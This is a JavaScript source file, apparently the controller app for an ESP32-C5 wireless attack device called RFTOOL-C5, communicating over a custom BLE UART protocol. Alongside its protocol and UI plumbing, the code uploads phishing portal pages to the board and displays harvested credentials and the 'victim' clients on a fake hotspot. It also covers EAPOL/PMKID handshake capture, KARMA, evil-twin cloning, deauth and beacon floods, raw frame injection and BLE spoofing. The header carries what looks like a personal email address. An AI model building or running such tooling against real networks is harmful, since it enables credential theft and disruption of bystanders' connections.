/*
   RFTOOL-C5 App — BLE 直连控制
   Developer: CN112 / CN1123243
 */

/* 版本 */
const APP_VERSION  = '2.3.3';
const APP_BUILD    = '2026.09';
const APP_AUTHOR      = 'CN112';
const APP_AUTHOR_FULL = 'CN1123243';
const APP_AUTHOR_MAIL = '15718376341@163.com';
let   fwVersion    = '--';   /* 固件版本, 握手后填充 */

/*
   Nordic UART Service (NUS) — 标准 128-bit UUID
   便于 Flutter / flutter_blue_plus、nRF Connect 等通用客户端复用
 */
const SVC_UUID = '6e400001-b5a3-f393-e0a9-e50e24dcca9e';
const RX_UUID  = '6e400002-b5a3-f393-e0a9-e50e24dcca9e';   /* 手机 -> 板 */
const TX_UUID  = '6e400003-b5a3-f393-e0a9-e50e24dcca9e';   /* 板 -> 手机 */

/* 动态发现到的实际 UUID */
let actualSvc = SVC_UUID, actualRx = RX_UUID, actualTx = TX_UUID;

/* 握手等待器 (连接后发 version 命令, 收到含 RFTOOL 的响应即确认) */
let handshakeResolve = null;

/*
   NUS 二进制帧协议 (与固件 main/ble_cli.c 保持一致)
     [0]    MAGIC 0xA5
     [1]    TYPE   0x01=CMD 0x02=DATA 0x03=ACK 0x04=ERR
     [2]    FLAGS  bit0=FIRST(消息首片) bit1=LAST(消息末片)
     [3..4] SEQ    uint16 小端
     [5..6] LEN    uint16 小端 (payload 字节数)
     [7..]  PAYLOAD (UTF-8 文本)
     [7+LEN]CRC8   poly 0x07, 覆盖 TYPE..PAYLOAD
 */
const NUS_MAGIC = 0xA5;
const NUS_T_CMD = 0x01, NUS_T_DATA = 0x02, NUS_T_ACK = 0x03, NUS_T_ERR = 0x04;
const NUS_T_FILE = 0x10;   /* 文件分片: payload = [offset:4 LE][raw bytes] */
const NUS_T_CHUNK = 0x11;  /* 二进制回传: payload = [offset:4 LE][bytes] (原始帧拉取) */
const NUS_F_FIRST = 0x01, NUS_F_LAST = 0x02;
const NUS_HDR = 7;
const NUS_MAX_PAYLOAD = 220;

const NUS_CRC_TABLE = (() => {
    const t = new Uint8Array(256);
    for (let i = 0; i < 256; i++){
        let c = i;
        for (let b = 0; b < 8; b++) c = (c & 0x80) ? (((c << 1) ^ 0x07) & 0xff) : ((c << 1) & 0xff);
        t[i] = c;
    }
    return t;
})();
function crc8(bytes){
    let c = 0;
    for (let i = 0; i < bytes.length; i++) c = NUS_CRC_TABLE[(c ^ bytes[i]) & 0xff];
    return c;
}

let nusSeq = 1;
/* 编码: 原始字节 -> 一个或多个 NUS 帧 */
function nusEncodeBytes(data, type = NUS_T_CMD){
    const frames = [];
    let off = 0;
    do {
        const chunk = Math.min(NUS_MAX_PAYLOAD, data.length - off);
        const f = new Uint8Array(NUS_HDR + chunk + 1);
        f[0] = NUS_MAGIC;
        f[1] = type;
        f[2] = (off === 0 ? NUS_F_FIRST : 0) | (off + chunk >= data.length ? NUS_F_LAST : 0);
        f[3] = nusSeq & 0xff;  f[4] = (nusSeq >> 8) & 0xff;
        f[5] = chunk & 0xff;   f[6] = (chunk >> 8) & 0xff;
        f.set(data.subarray(off, off + chunk), NUS_HDR);
        f[NUS_HDR + chunk] = crc8(f.subarray(1, NUS_HDR + chunk));
        frames.push(f);
        nusSeq = (nusSeq + 1) & 0xffff;
        off += chunk;
    } while (off < data.length);
    return frames;
}

/* 编码: 文本 -> 一个或多个 NUS 帧 */
function nusEncode(text, type = NUS_T_CMD){
    return nusEncodeBytes(new TextEncoder().encode(text), type);
}

/* 解码: 字节流 -> 完整逻辑消息 (跨帧重组) */
let nusRxBuf = new Uint8Array(0);
let nusAsm = [];
let nusStat = { rx: 0, tx: 0, crcErr: 0, drop: 0 };

/* 原始帧落盘 (cap) 状态 */
let boardIp = '192.168.71.1';       /* 板载服务地址, 从 HTTP/PHISH START 行更新 */
let capSt = { on:false, keyonly:false, frames:0, drops:0, bytes:0, cap:0, keys:0, full:false };
let capIndex = [];                  /* cap keys 解析出的关键帧索引 */
let capPull = null;                 /* 拉取中的缓冲 { buf, total, recv, onProgress } */
let capReadWait = null;             /* 等待 META,CAP,READ 收尾行 */
let httpRunning = false;            /* 板载 HTTP 服务状态 */
let capKeysWait = null;             /* 等待 cap keys 索引收齐 */

/* EAPOL 握手归档 */
let hsSt = { total: 0, complete: 0, pmkid: 0, seen: [0, 0, 0, 0] };
let hsList = [];                    /* 当前列出的记录 */
let hsGrab = null;                  /* 收集中: { lines: [] } */
let hsWait = null;                  /* 等待 hs 输出收尾 */

/* KARMA (Probe Request SSID) */
let karmaList = [];
let karmaCount = 0;

/* BLE 近邻扫描 (板子侧) */
let bleDevList = [];

/* 工具台: BLE 广播伪造 (bleadv) */
let advSt = { active:false, type:'none', remain:0, dur:0, link:'--' };
let advMode = 'ibeacon';       /* 表单当前模式 */
let advTick = null;            /* 剩余秒数倒计时 */
let advAck = null;             /* 等待 START 回执的超时器 */
let advNoAck = false;          /* 未收到回执: 可能因单广播实例导致链路中断 */

/* 工具台: FTM 真实测距 (ftm) */
let ftmSt = { peer:'', status:'', code:0, distCm:0, distM:0, rttEst:0, rttRaw:0, entries:0 };
let ftmBursts = [];            /* 每 burst 明细 {i,rssi,rtt} */
let ftmWait = null;            /* 等待 REPORT/ERR 的超时器 */

/* 工具台: 802.15.4 嗅探 (zbsniff) */
let zbSt = { on:false, ch:0, total:0, frames:0, drops:0, cap:0 };
let zbList = [];               /* 界面展示的帧 */
let zbExpect = -1;             /* DUMP 头部声明的条数 */
let zbPoll = null;             /* 嗅探中的状态轮询 */
let zbRenderTimer = null;      /* 批量渲染节流 */

/* 工具台: BLE 发射功率 (ble power) */
let blePowerLv = -1;           /* 当前功率等级 (0-15), -1=未查询 */
const ZB_SHOW_MAX = 300;       /* 单次最多渲染条数, 防止 512 帧撑爆 DOM */

function nusFeed(bytes){
    const buf = new Uint8Array(nusRxBuf.length + bytes.length);
    buf.set(nusRxBuf); buf.set(bytes, nusRxBuf.length);
    nusRxBuf = buf;

    let i = 0;
    while (i < nusRxBuf.length){
        if (nusRxBuf[i] !== NUS_MAGIC){ i++; nusStat.drop++; continue; }
        if (nusRxBuf.length - i < NUS_HDR) break;
        const plen = nusRxBuf[i+5] | (nusRxBuf[i+6] << 8);
        if (plen > NUS_MAX_PAYLOAD){ i++; nusStat.drop++; continue; }
        const total = NUS_HDR + plen + 1;
        if (nusRxBuf.length - i < total) break;   /* 等后续字节 */

        const frame = nusRxBuf.subarray(i, i + total);
        if (crc8(frame.subarray(1, NUS_HDR + plen)) !== frame[total - 1]){
            nusStat.crcErr++;
            dlog('[NUS] CRC 校验失败, 丢弃一帧');
            i++; continue;
        }
        const flags = frame[2], type = frame[1];
        nusStat.rx++;
        linkLastRx = Date.now();
        if ((flags & NUS_F_FIRST) && nusAsm.length) nusAsm = [];
        if (plen) nusAsm.push(frame.subarray(NUS_HDR, NUS_HDR + plen));
        if (flags & NUS_F_LAST){
            let n = 0;
            for (const p of nusAsm) n += p.length;
            const msg = new Uint8Array(n);
            let o = 0;
            for (const p of nusAsm){ msg.set(p, o); o += p.length; }
            nusAsm = [];
            handleNusMessage(type, msg);
        } else if (nusAsm.length > 4096){
            /* 长时间没收全的巨型消息 (例如丢包导致 LAST 帧丢失): 丢弃, 防止内存无界增长.
             * 固件侧已保证单片 <= 1KB, 正常列表几十片以内, 不会走到这里. */
            nusStat.drop++;
            dlog('[NUS] 分片过多, 放弃重组 (可能丢包)');
            nusAsm = [];
        }
        i += total;
    }
    nusRxBuf = nusRxBuf.subarray(i);
}

function handleNusMessage(type, bytes){
    /* 二进制分片 (原始帧拉取): 不进文本通道 */
    if (type === NUS_T_CHUNK){ handleChunkMessage(bytes); return; }

    const txt = new TextDecoder().decode(bytes);
    if (type === NUS_T_ERR) dlog('[NUS] 设备返回 ERR 帧');
    if (devMode) dlog('[NUS] RX type=' + type + ' ' + bytes.length + 'B: ' + txt.slice(0,80).replace(/\n/g,'\\n'));
    /* 握手识别 */
    if (handshakeResolve && /rftool|esp32|c5|version|v1\.[0-9]/i.test(txt)){
        dlog('[握手] 匹配成功: ' + txt.slice(0,40));
        const r = handshakeResolve; handshakeResolve = null; r(txt);
    }
    handleNotifyData(txt);
}

/* 二进制分片: payload = [offset:4 LE][bytes] -> 写入当前拉取缓冲.
 * 固件给的是文件绝对偏移, 缓冲按 base 折算相对位置. */
function handleChunkMessage(bytes){
    if (!capPull || bytes.length < 5) return;
    const off = (bytes[0] | (bytes[1] << 8) | (bytes[2] << 16) | (bytes[3] << 24)) >>> 0;
    const rel = off - capPull.base;
    const data = bytes.subarray(4);
    if (rel < 0 || rel + data.length > capPull.buf.length) return;
    capPull.buf.set(data, rel);
    capPull.recv += data.length;
    if (capPull.onProgress) capPull.onProgress(capPull.recv, capPull.total);
}

/* 写单个已组好的帧.
 * 必须按协商 MTU 切片: Android 原生层单次写入上限 = MTU-3, 超出会被直接拒收
 * (大帧静默失败, 表现为 HTML 上传无效). 固件 RX 侧按字节流重组, 切片不影响帧边界. */
/* 单次写入的载荷上限 = 协商 MTU - 3 (ATT 头).
 * MTU 还没读到时按最保守的 20 字节来, 免得第一次写就被拒在那里卡住. */
function sliceCap(){
    return negotiatedMtu >= 27 ? negotiatedMtu - 3 : 20;
}

async function nusWriteFrame(frame){
    const cap = sliceCap();

    if (!useCapacitorBle){
        /* WebBluetooth: 固件 RX 同时声明了 WRITE 和 WRITE_NO_RSP.
         * 默认的 writeValue 走 Write Request, 每帧都要等一个 Write Response
         * 的往返 (一个连接间隔起步). 改成无应答写, 命令延迟直接减一跳. */
        if (rxChar){
            const noRsp = rxChar.properties &&
                          (rxChar.properties.writeWithoutResponse === true);
            for (let off = 0; off < frame.length; off += cap){
                const slice = frame.subarray(off, Math.min(off + cap, frame.length));
                if (noRsp) await rxChar.writeValueWithoutResponse(slice);
                else       await rxChar.writeValue(slice);
            }
        }
        return;
    }

    const capBle = getCapBle();
    for (let off = 0; off < frame.length; off += cap){
        const slice = frame.subarray(off, Math.min(off + cap, frame.length));
        await capBle.writeWithoutResponse({
            deviceId: capDeviceId, service: actualSvc,
            characteristic: actualRx, value: bytesToHexStr(slice)
        });
        /* 无应答写没有流控, 连发太快会被原生层以 "no tx buffer" 拒掉.
         * 留一点点间隔但别太久: 8ms 在上传几 KB 的自定义页面时会累积到
         * 上百毫秒, 那纯粹是白等. */
        if (off + cap < frame.length) await new Promise(r => setTimeout(r, 3));
    }
}

/* 发送一条命令 (自动组帧) */
async function nusWrite(cmd){
    const frames = nusEncode(cmd + '\n', NUS_T_CMD);
    nusStat.tx += frames.length;
    for (let i = 0; i < frames.length; i++){
        await nusWriteFrame(frames[i]);
        if (i < frames.length - 1) await new Promise(r => setTimeout(r, 12));
    }
}

/* 上传 HTML 到设备 Flash (FILE 帧分片, 带偏移, 可重传) */
async function nusUploadHtml(bytes, onProgress){
    if (!connected) throw new Error('未连接设备');
    cmdSending = true;   /* 暂停命令队列, 避免插队 */
    try {
        await nusWrite('phish html begin ' + bytes.length);
        await new Promise(r => setTimeout(r, 300));
        const CH = NUS_MAX_PAYLOAD - 4;
        for (let off = 0; off < bytes.length; off += CH){
            const chunk = bytes.subarray(off, Math.min(off + CH, bytes.length));
            const payload = new Uint8Array(4 + chunk.length);
            payload[0] = off & 0xff;            payload[1] = (off >>> 8) & 0xff;
            payload[2] = (off >>> 16) & 0xff;   payload[3] = (off >>> 24) & 0xff;
            payload.set(chunk, 4);
            for (const f of nusEncodeBytes(payload, NUS_T_FILE)) await nusWriteFrame(f);
            if (onProgress) onProgress(off + chunk.length, bytes.length);
            await new Promise(r => setTimeout(r, 5));
        }
        await nusWrite('phish html end');
    } finally {
        cmdSending = false;
        processCmdQueue();   /* 唤醒被暂停的命令队列 */
    }
}

/* DOM */
const $ = id => document.getElementById(id);
const logBox = $('logBox');

/* 连接状态 */
let bleDevice = null, bleServer = null, rxChar = null, txChar = null;
let useCapacitorBle = false, capDeviceId = null, lastDevice = null, notifyListener = null, disconnectListener = null;
let connected = false, connecting = false, negotiatedMtu = 0;
let bleScanHandle = null;
const bleDevices = new Map();
const apList = [];
const clientList = [];
let selectedAp = null, selectedClient = null;

/* 命令队列 (防止 BLE 发送过快丢包) */
const cmdQueue = [];
let cmdSending = false;
const CMD_INTERVAL = 60; /* 命令间最小间隔 ms */

/* 日志节流 */
let logBuffer = [];
let logFlushTimer = null;

/* 自动重连 (指数退避) */
let autoReconnect = false;
let reconnectTimer = null;
let reconnectAttempts = 0;
let linkLastRx = Date.now();      /* 最近一次收到 BLE 数据的时刻 */
let linkDeadProbes = 0;           /* 连续无响应探测次数 */
let linkPhy = '未协商';            /* 当前 LE PHY, 由 status 回报 */
let linkWatchTimer = null;        /* 链路看门狗句柄, 不保存的话重连会叠加定时器 */
const RECONNECT_BASE = 1000;    /* 首次退避 1s */
const RECONNECT_MAX  = 30000;   /* 上限 30s */

/* 状态轮询 */
let statusTimer = null;

/* 开发者模式 */
let devMode = false;
function dlog(text){
    if (devMode) log('[DBG] ' + text, 'meta');
}

/*
   版本显示
 */
function applyVersionUI(){
    const set = (id, val) => { const el = $(id); if (el) el.textContent = val; };
    set('splashVer', APP_VERSION);
    set('appVer', 'V' + APP_VERSION);
    set('appVerLong', APP_VERSION);
    set('appBuild', APP_BUILD);
    set('fwVer', fwVersion);
    set('fwVer2', fwVersion);
    set('ciApp', APP_VERSION);
    set('ciFw', fwVersion);
    set('aboutVer', APP_VERSION);
    set('aboutBuild', APP_BUILD);
    document.querySelectorAll('[data-author]').forEach(n => { n.textContent = APP_AUTHOR; });
    document.querySelectorAll('[data-author-full]').forEach(n => { n.textContent = APP_AUTHOR_FULL; });
    document.querySelectorAll('[data-author-mail]').forEach(n => { n.textContent = APP_AUTHOR_MAIL; });
}

/*
   UI 状态 / 动效工具
 */
/* 频段推导: 1-14 -> 2.4G, >=32 -> 5G */
function bandOf(ch){
    const n = parseInt(ch);
    if (!isFinite(n) || n <= 0) return '--';
    if (n >= 1 && n <= 14) return '2.4G';
    if (n >= 32) return '5G';
    return '--';
}
function updateBand(band){
    const hud = $('stBand'), cell = $('stBand2'), ci = $('ciBand');
    if (hud){
        hud.textContent = 'BAND ' + band;
        hud.className = 'band' + (band === '2.4G' ? ' g24' : band === '5G' ? ' g5' : band === 'AUTO' ? ' gauto' : '');
    }
    if (cell) cell.textContent = band;
    if (ci) ci.textContent = band;
}

/* 数值变化动画 */
function setStat(id, val){
    const el = $(id);
    if (!el) return;
    const s = String(val);
    if (el.textContent === s) return;
    el.textContent = s;
    if (el.classList.contains('v')){
        el.classList.remove('bump');
        void el.offsetWidth;
        el.classList.add('bump');
    }
}

/* 顶部作业进度条 */
let jobActive = false;
function setJobActive(on){
    on = !!on;
    if (on === jobActive) return;
    jobActive = on;
    const b = $('jobBar');
    if (b) b.classList.toggle('on', on);
}

/* 雷达扫描指示 */
function radar(id, on){ const el = $(id); if (el) el.classList.toggle('on', !!on); }

/* 标签滑动指示器 */
function moveTabInd(){
    const tabs = $('tabs'), ind = $('tabInd');
    if (!tabs || !ind) return;
    const act = tabs.querySelector('.tab.active');
    if (!act){ ind.style.width = '0px'; return; }
    ind.style.left = act.offsetLeft + 'px';
    ind.style.width = act.offsetWidth + 'px';
}

/*
   钓鱼门户状态
 */
let phishOn = false, phishCredCount = 0, phishHtmlBytes = 0;
let phishCreds = [];        /* [{id, ip, fields:[{k,v}]}] */
let phishCredCur = null;
let phishStas = [];         /* [{mac, rssi}] 已接入假热点的客户端 */

function updatePhishUI(){
    const c = $('credCount');
    if (c) c.textContent = phishCredCount + ' 条';
    const info = $('phishHtmlInfo');
    if (info) info.textContent = '当前: ' + (phishHtmlBytes > 0
        ? ('自定义页面 ' + (phishHtmlBytes/1024).toFixed(1) + ' KB')
        : '内置模板') + ' · 上限 1 MB';
    const sc = $('pstaCount');
    if (sc) sc.textContent = phishStas.length + ' 台';
    const radarOn = phishStas.length > 0;
    const r = $('pstaRadar');
    if (r) r.classList.toggle('on', radarOn);
}

/* 已接入门户热点的客户端，用来确认受害者到底连上没有 */
function renderPhishSta(){
    const list = $('pstaList');
    if (!list) return;
    if (phishStas.length === 0){
        list.innerHTML = '<div class="list-empty">点「查询客户端」看当前有没有设备连上假热点</div>';
        return;
    }
    const sorted = [...phishStas].sort((a, b) => b.rssi - a.rssi);
    list.innerHTML = sorted.map(s =>
        `<div class="line ${s.rssi >= -60 ? 'ok' : 'meta'}">` +
        `${String(s.rssi).padStart(4)}dBm  ${s.mac}</div>`
    ).join('');
}

function renderCreds(){
    const list = $('credList');
    if (!list) return;
    if (phishCreds.length === 0){
        list.innerHTML = '<div class="list-empty">门户收到表单提交后会显示在这里</div>';
        return;
    }
    list.innerHTML = '';
    const arr = [...phishCreds].reverse();
    arr.forEach((c, i) => {
        const item = document.createElement('div');
        item.className = 'list-item';
        item.style.animationDelay = (i * 20) + 'ms';
        const fields = c.fields.map(f => `<span>${f.k}=<b style="color:var(--cyan)">${f.v}</b></span>`).join('');
        item.innerHTML = `
            <div class="ic">#${c.id}</div>
            <div class="nm">
                <div class="ssid">${c.fields.find(f=>/pass|pwd|word/i.test(f.k))?.v || '(无密码字段)'}</div>
                <div class="meta">${fields}</div>
            </div>
            <div class="rssi">${c.ip || ''}</div>`;
        item.addEventListener('click', () => copyText(c.fields.map(f=>f.k+'='+f.v).join('  ')));
        list.appendChild(item);
    });
}

/* 连接信息卡 */
function updateConnInfo(){
    const set = (id, v) => { const el = $(id); if (el) el.textContent = v; };
    set('ciApp', APP_VERSION);
    set('ciFw', fwVersion);
    set('ciDev', lastDevice ? (lastDevice.name || lastDevice.deviceId || '--') : '--');
    set('ciMtu', negotiatedMtu ? (negotiatedMtu + ' B') : '--');
    set('ciSvc', actualSvc ? actualSvc.slice(0, 18) + '…' : '--');
}

/*
   开屏动画
 */
window.addEventListener('load', () => {
    applyVersionUI();
    updateConnInfo();
    updateBand('--');
    setControlsEnabled(false);
    setJobActive(false);
    updatePhishUI();
    renderCreds();
    renderPhishSta();
    setTimeout(moveTabInd, 60);
    setTimeout(() => {
        $('splash').classList.add('hidden');
        setTimeout(() => { $('splash').style.display = 'none'; }, 900);
    }, 2400);
});

/*
   Toast 通知
 */
let toastTimer = null;
function toast(text, cls=''){
    const el = $('toast');
    const msg = $('toastMsg');
    if (msg) msg.textContent = text; else el.textContent = text;
    el.className = 'toast show ' + cls;
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => { el.className = 'toast'; }, 2200);
}

/*
   日志 (节流批量渲染)
 */
let logAuto = true;
function log(text, cls=''){
    logBuffer.push({ text, cls });
    if (!logFlushTimer){
        logFlushTimer = setTimeout(flushLog, 80);
    }
}
function flushLog(){
    logFlushTimer = null;
    if (logBuffer.length === 0) return;
    const frag = document.createDocumentFragment();
    for (const item of logBuffer){
        const line = document.createElement('div');
        line.className = 'line ' + item.cls;
        line.textContent = item.text;
        frag.appendChild(line);
    }
    logBox.appendChild(frag);
    if (logAuto) logBox.scrollTop = logBox.scrollHeight;
    while (logBox.children.length > 500) logBox.removeChild(logBox.firstChild);
    logBuffer = [];
}

/*
   涟漪点击效果
 */
document.addEventListener('click', e => {
    const btn = e.target.closest('.btn');
    if (!btn) return;
    const rect = btn.getBoundingClientRect();
    const size = Math.max(rect.width, rect.height);
    const rip = document.createElement('span');
    rip.className = 'ripple';
    rip.style.width = rip.style.height = size + 'px';
    rip.style.left = (e.clientX - rect.left - size/2) + 'px';
    rip.style.top = (e.clientY - rect.top - size/2) + 'px';
    btn.appendChild(rip);
    setTimeout(() => rip.remove(), 550);
});

/*
   按钮加载态
 */
function setBtnLoading(btnId, loading){
    const btn = $(btnId);
    if (!btn) return;
    if (loading) btn.classList.add('loading');
    else btn.classList.remove('loading');
}

/*
   连接状态 UI
 */
function setConnected(on, name=''){
    connected = on;
    connecting = false;
    if (on){
        $('connDot').className = 'dot on';
        $('connText').textContent = '已连接';
        $('devInfo').textContent = name || 'rftool-c5';
        $('btnScan').disabled = true;
        $('btnDisconnect').disabled = false;
        setControlsEnabled(true);
        updateConnInfo();
        /* 启动状态轮询 */
        startStatusPoll();
    } else {
        $('connDot').className = 'dot';
        $('connText').textContent = '未连接';
        $('devInfo').textContent = '搜索设备并连接';
        $('btnScan').disabled = false;
        $('btnDisconnect').disabled = true;
        setControlsEnabled(false);
        negotiatedMtu = 0;
        fwVersion = '--';
        updateBand('--');
        updateConnInfo();
        /* 工具台: 断线时停掉本地倒计时/轮询, 避免 UI 假装还在运行 */
        stopAdvTick(); advSt.active = false; advSt.remain = 0; advSt.link = '--'; advNoAck = false; updateAdvUI();
        stopZbPoll(); zbSt.on = false; radar('zbRadar', false); updateZbUI();
        if (ftmWait){ clearTimeout(ftmWait); ftmWait = null; setBtnLoading('ftmRun', false); }
        stopStatusPoll();
    }
}

/* 统一启停所有需要连接的功能按钮 */
const CTRL_IDS = ['btnSniff','btnStop','btnScanApFast','btnScanApDeep','btnScanApStop',
    'btnApRefresh','btnCliScan','btnCliRefresh','btnCliClear',
    'btnDeauth','btnBeacon','btnStop2','btnProbe','btnStop3',
    'btnDowngrade','btnStop4','btnRaw','btnStatus',
    'btnDumpAps','btnDumpClis','btnDumpEapols','btnDumpAll',
    'btnExportCsv','btnExportJson','btnHttpStart','btnHttpStatus','btnHttpStop',
    'btnHelp','btnVersion','btnResetStats','btnClearAp',
    'btnPhishStart','btnPhishStatus','btnPhishStop','btnPhishUpload',
    'btnPhishHtmlSize','btnPhishHtmlClear','btnCredRefresh','btnCredClear','btnCredCopy',
    'btnPhishSta',
    'btnCapStart','btnCapStop','btnCapRefresh','btnCapClear','btnCapKeys',
    'btnHsRefresh','btnHsExport','btnHsClear',
    'btnEtClone','btnEtClonePush','btnEtStop',
    'btnKarmaRefresh','btnKarmaClear','rawHex',
    'btnRawTx','btnRawDeauth','btnRawBeacon','btnRawProbeResp','btnRawAuth',
    'btnBleScanStart','btnBleScanStop','btnBleScanRefresh','btnBleScanClear',
    /* 工具台 (Tools) */
    'advTypeI','advTypeE','advUuid','advMajor','advMinor','advUrl','advSec',
    'advStart','advStop','advStatus',
    'ftmApSelect','ftmBssid','ftmCh','ftmCount','ftmRun',
    'zbCh','zbStart','zbStop','zbRefresh','zbDump','zbClear',
    'blePwrRange','blePwrApply','blePwrQuery'];
function setControlsEnabled(on){
    CTRL_IDS.forEach(id => { const el = $(id); if (el) el.disabled = !on; });
}

function setConnecting(on){
    connecting = on;
    if (on){
        $('connDot').className = 'dot connecting';
        $('connText').textContent = '连接中';
    }
}

/*
   Capacitor 插件检测
 */
function getCapBle(){
    const Cap = window.Capacitor;
    return (Cap && Cap.Plugins && Cap.Plugins.BluetoothLe) || null;
}
/* 将字节数组转为 Capacitor 原生插件需要的空格分隔十六进制字符串 */
function bytesToHexStr(bytes){
    return Array.from(bytes).map(b => b.toString(16).padStart(2,'0')).join(' ');
}

/*
   BLE 扫描
 */
async function startBleScan(){
    if (bleScanHandle){ toast('扫描已在进行中', 'warn'); return; }
    bleDevices.clear();
    $('bleList').innerHTML = '<div class="list-empty">正在扫描 BLE 设备...</div>';
    $('blePanel').style.display = 'block';
    radar('bleRadar', true);
    $('bleCount').textContent = '扫描中...';

    const capBle = getCapBle();

    if (capBle){
        useCapacitorBle = true;
        try {
            log('初始化蓝牙...', 'warn');
            await capBle.initialize();

            capBle.addListener('onScanResult', result => {
                const id = result.device.deviceId;
                if (!bleDevices.has(id)){
                    bleDevices.set(id, {
                        deviceId: id,
                        name: result.device.name || '(无名称)',
                        rssi: result.rssi
                    });
                    renderBleList();
                }
            });

            log('正在扫描附近 BLE 设备...', 'warn');
            toast('正在扫描 BLE 设备...', 'warn');
            await capBle.requestLEScan({ allowDuplicates: false });
            bleScanHandle = true;
            setTimeout(stopBleScan, 8000);
            return;
        } catch(e){
            log('后台扫描失败, 改用系统选择器: ' + e.message, 'warn');
            try {
                const device = await capBle.requestDevice({});
                if (device && device.deviceId){
                    connectToDevice({ deviceId: device.deviceId, name: device.name });
                    return;
                }
            } catch(e2){
                log('蓝牙连接失败: ' + e2.message, 'err');
                toast('蓝牙连接失败', 'err');
            }
        }
    }

    if (navigator.bluetooth && navigator.bluetooth.requestLEScan){
        useCapacitorBle = false;
        try {
            navigator.bluetooth.addEventListener('advertisementreceived', ev => {
                const id = ev.device.id;
                if (!bleDevices.has(id)){
                    bleDevices.set(id, {
                        deviceId: id, device: ev.device,
                        name: ev.device.name || '(无名称)', rssi: ev.rssi
                    });
                    renderBleList();
                }
            });
            log('正在扫描附近 BLE 设备...', 'warn');
            const scan = await navigator.bluetooth.requestLEScan({ acceptAllAdvertisements: true });
            bleScanHandle = scan;
            setTimeout(stopBleScan, 8000);
        } catch(e){
            log('Web Bluetooth 扫描失败: ' + e.message, 'err');
        }
    } else if (!capBle) {
        useCapacitorBle = false;
        log('打开系统蓝牙选择器...', 'warn');
        try {
            const device = await navigator.bluetooth.requestDevice({
                filters: [{ services: [SVC_UUID] }], optionalServices: [SVC_UUID]
            });
            connectToDevice({ device });
        } catch(e){ log('蓝牙选择失败: ' + e.message, 'err'); }
    }
}

function stopBleScan(){
    if (useCapacitorBle){
        const capBle = getCapBle();
        if (capBle) capBle.stopLEScan && capBle.stopLEScan().catch(()=>{});
    } else if (bleScanHandle && typeof bleScanHandle.stop === 'function'){
        try { bleScanHandle.stop(); } catch(e){}
    }
    bleScanHandle = null;
    radar('bleRadar', false);
    $('bleCount').textContent = bleDevices.size + ' 个设备';
    if (bleDevices.size === 0){
        $('bleList').innerHTML = '<div class="list-empty">未发现设备, 请确认设备已上电广播</div>';
    }
}

function renderBleList(){
    const list = $('bleList');
    if (bleDevices.size === 0){
        list.innerHTML = '<div class="list-empty">正在扫描...</div>';
        return;
    }
    list.innerHTML = '';
    const sorted = [...bleDevices.values()].sort((a,b) => (b.rssi||0) - (a.rssi||0));
    for (const d of sorted){
        const isTarget = (d.name || '').toLowerCase().includes('rftool-c5') ||
                         (d.name || '').toLowerCase() === 'rftool-c5';
        const item = document.createElement('div');
        item.className = 'list-item' + (isTarget ? ' selected' : '');
        item.innerHTML = `
            <div class="ic">${isTarget ? '>>' : '  '}</div>
            <div class="nm">
                <div class="ssid">${d.name}${isTarget ? ' <span style="color:var(--cyan);font-size:9px;">RFTOOL-C5</span>' : ''}</div>
                <div class="meta"><span>${d.deviceId.slice(0,17)}...</span></div>
            </div>
            <div class="rssi">${d.rssi || '--'} dBm</div>
        `;
        item.addEventListener('click', () => connectToDevice(d));
        list.appendChild(item);
    }
    $('bleCount').textContent = bleDevices.size + ' 个设备';
}

/*
   连接设备 (含 MTU + 超时)
 */
async function connectToDevice(d){
    if (!d){ log('无效设备', 'err'); return; }
    if (connecting){
        log('正在连接中, 请稍候...', 'warn');
        toast('正在连接中...', 'warn');
        return;
    }
    stopBleScan();
    connecting = true;
    setConnecting(true);
    lastDevice = d;
    log('[连接] 开始连接 ' + (d.name || d.deviceId || '(未知)') + (useCapacitorBle ? ' [Capacitor]' : ' [WebBluetooth]'), 'warn');
    dlog('设备信息: name=' + d.name + ' deviceId=' + d.deviceId + ' id=' + (d.id||''));

    const timeout = new Promise((_, rej) => setTimeout(() => rej(new Error('连接超时(15s)')), 15000));

    try {
        if (useCapacitorBle){
            const capBle = getCapBle();
            capDeviceId = d.deviceId;
            log('连接中: ' + (d.name || d.deviceId) + ' ...', 'warn');
            dlog('调用 capBle.connect({deviceId: ' + capDeviceId + '})');

            /* 注册断开监听, 用于自动重连 */
            if (disconnectListener){ try { await disconnectListener.remove(); } catch(_){} disconnectListener = null; }
            disconnectListener = await capBle.addListener('disconnected|' + capDeviceId, () => {
                dlog('[断开] 收到原生断开事件');
                onDisconnect();
            });

            await Promise.race([ capBle.connect({ deviceId: capDeviceId }), timeout ]);
            log('GATT 已连接, 发现服务...', 'ok');
            dlog('capBle.connect 成功, 调用 getServices');

            /* MTU: 请求 512 (固件侧上限 256). requestMtu 的返回值不可靠,
             * 统一用 getMtu 回读真实协商值, 失败则回退 23 (ATT 默认最小). */
            try {
                const r = await capBle.requestMtu({ deviceId: capDeviceId, mtu: 512 });
                dlog('requestMtu 返回: ' + JSON.stringify(r));
            }
            catch(e){ dlog('requestMtu 失败: ' + e.message); }
            try {
                const m = await capBle.getMtu({ deviceId: capDeviceId });
                negotiatedMtu = (m && m.value) || 0;
            }
            catch(e){ dlog('getMtu 失败: ' + e.message); }
            if (negotiatedMtu > 23){
                log('MTU 已协商: ' + negotiatedMtu + ' (单帧上限 ' + (negotiatedMtu - 3) + 'B)', 'meta');
            } else {
                negotiatedMtu = 23;
                log('MTU 未协商, 回退 23 (单帧上限 20B)', 'warn');
            }

            /* 辅助: 解析单个特征的属性 (兼容对象/数组/字符串) */
            function parseProps(p){
                const props = {};
                if (typeof p === 'object' && p !== null){
                    for (const k of Object.keys(p)){ if (p[k]) props[k.toLowerCase()] = true; }
                } else if (Array.isArray(p)){
                    for (const k of p) props[String(k).toLowerCase()] = true;
                } else if (typeof p === 'string'){
                    p.split(',').forEach(k => props[k.trim().toLowerCase()] = true);
                }
                return props;
            }
            function hasProp(props, names){
                return names.some(n => props[n] === true);
            }
            /* 判断是否为标准 16-bit UUID 服务 (GAP/GATT 等, 应跳过) */
            function isStdSvc(uuid){
                return /^0000[0-9a-f]{4}-0000-1000-8000-00805f9b34fb$/.test(uuid);
            }

            /* getServices 已包含所有服务及其特征, 直接解析 */
            let found = false;
            let parsed = [];   /* 提到外层, 供失败时打印可用服务 */
            try {
                const svcsResp = await capBle.getServices({ deviceId: capDeviceId });
                const fullResp = JSON.stringify(svcsResp);
                dlog('getServices 原始返回(' + fullResp.length + 'B): ' + fullResp);
                const svcs = (svcsResp?.services || svcsResp || []);
                log('发现 ' + svcs.length + ' 个服务', 'meta');

                /* 解析所有服务 */
